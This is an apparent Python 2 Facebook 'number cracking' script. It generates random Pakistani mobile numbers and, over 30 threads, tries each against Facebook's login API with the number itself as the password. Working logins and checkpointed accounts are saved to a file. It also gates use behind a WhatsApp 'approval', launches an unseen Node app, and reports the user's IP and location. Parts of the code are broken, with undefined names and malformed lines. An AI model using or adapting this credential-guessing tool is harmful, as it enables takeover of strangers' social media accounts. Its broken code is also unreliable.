#!/usr/bin/python2
# coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf ._______________server')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('._______________server', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 somiiiii.py')
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
####Logo####
logo = """
\033[1;91m     o      ooooo  oooo ooooo  
\033[1;92m    888       888  88    888  
\033[1;93m   8  88        888      888  
\033[1;94m  8oooo88      88 888    888  
\033[1;95mo88o  o888o o88o  o888o o888o 
\033[1;96m------------------------------------------------------------
\033[1;97m Auther   : AHMAD
\033[1;98m GitHub   : https://github.com/ahmad77412
\033[1;99m YouTube  : Tips & Tricks       
  -----------------------------------------------------------------------------------------                                                       
"""
def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/server.txt').text
    if to in r:
        os.system('cd zzzzz && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd zzzzz && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ' \033[1;92mCopy token id and send to Owner'
        print ' \033[1;92mYour id: ' + to
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923047274393')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \033[1;92mCopy and press enter , And Send Me'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923047274393')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\033[1;92m Your country: ' + country
    time.sleep(1)
    print '\033[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    methodlogin()
    
def methodlogin(): 
    print logo
    print 
    os.system('clear')
    print logo
    print ''
    print('\n  \x1b[1;97m[01] \x1b[1;97m Start number cracking\n\n\n')
    ________________________________()
def ________________________________():
    global cpb
    global oks
    ________ = raw_input('\x1b[1;97m  choose option : \x1b[1;92m')
    if ________ == '':
        print '[!] Fill in correctly'
        ________________________________()
    elif ________ == '1':
        os.system('clear')
        print logo
        try:
            __________somi = raw_input("Choose Sim code : ")
            __________awan = '03'
            idlist = '._______________server'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            ________________()
    else:
        print '[!] Fill In Correctly'
        ________________________________()
    os.system('clear')
    print logo
    print''
    xxxx_____fuck____xxxx = str(len(id))
    print('  \033[1;97mTotal Numbers : ' +  xxxx_____fuck____xxxx)
    print('  To Stop Process Press Ctrl + Z')
    print 50 * '\x1b[1;90m-'
    print
    def main(arg):
        user = arg
        try:
            os.mkdir('________________________________save')
        except OSError:
            pass
        try:
            somi______password1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + __________awan + __________somi + user + '&locale=en_US&password=' + somi______password1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '  \x1b[1;97m(\x1b[1;92mOK Account\x1b[1;97m) ' + __________awan + __________somi + user+ ' \x1b[1;92m|\x1b[1;97m ' + somi______password1
                okb = open('save/________________________________.txt', 'a')
                okb.write(__________awan + __________somi + user + somi______password1 + '\n')
                okb.close()
                oks.append(__________somi + user + somi______password1)
            elif 'www.facebook.com' in q['error_msg']:
                print '  \x1b[1;97m(\x1b[1;90mCP Account\x1b[1;90m) ' + __________awan + __________somi + user + ' \x1b[1;93m|\x1b[1;97m ' + somi______password1
                cps = open('________________________________save/________________________________.txt', 'a')
                cps.write(__________awan + __________somi + user + somi______password1+ '\n')
                cps.close()
                cpb.append(__________somi + user + somi______password1)
            else:
                somi______password2 = __________awan +__________somi +user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + __________awan + __________somi + user + '&locale=en_US&password=' + somi______password2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '  \x1b[1;97m(\x1b[1;92mOK Account\x1b[1;97m) ' + __________awan + __________somi + user+ ' \x1b[1;92m|\x1b[1;97m ' + somi______password2
                    okb = open('________________________________save/________________________________.txt', 'a')
                    okb.write(__________awan + __________somi + user + + '\n')
                    okb.close()
                    oks.append(__________somi + user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                       print '  \x1b[1;97m(\x1b[1;90mCP Account\x1b[1;90m) ' + __________awan + __________somi + user + ' \x1b[1;93m|\x1b[1;97m ' + somi______password2
                       cps = open('________________________________save/________________________________.txt', 'a')
                       cps.write(__________awan + __________somi + somi______password2 + '\n')
                       cps.close()
                       cpb.append(__________somi + user + somi______password2)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'Cloned Accounts Has Been Saved : ________________________________save/________________________________.txt'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()
if __name__ == '__main__':
    reg()
